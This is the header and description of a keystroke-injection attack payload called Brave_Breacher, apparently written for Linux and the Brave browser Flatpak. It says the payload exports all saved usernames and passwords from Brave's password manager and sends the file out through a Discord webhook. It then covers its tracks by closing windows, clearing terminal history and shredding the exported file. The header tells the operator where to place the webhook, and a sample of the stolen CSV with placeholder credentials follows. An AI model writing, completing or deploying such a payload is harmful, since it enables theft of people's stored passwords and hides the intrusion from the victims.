REM TITLE: Brave_Breacher

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Pop!_OS) | Brave Browser Flatpak Version: 1.77.101

REM DESCRIPTION: Brave Breacher is a side-channel attack payload that utilizes various methods to navigate the Brave Browser GUI. The payload exports a copy of all usernames and passwords stored in the Brave Browser password manager. It then exfiltrates the file via discord webhook and obfuscates its' activity by closing all opened windows, clearing the terminal history, and shredding the exported 'Brave Passwords.csv' file once exfiltrated. To be operable, place Discord webhook in #WEBHOOK_URL constant on line 6.

**Exfiltrated password manager file:**
```
name,url,username,password,note
site1.com,https://site1.com/,user1,pass1,
site2.com,https://site2.com/,user2,pass2,
site3.com,https://site3.com/,user3,pass3,
site4.com,https://site4.com/,site4,pass4,
```
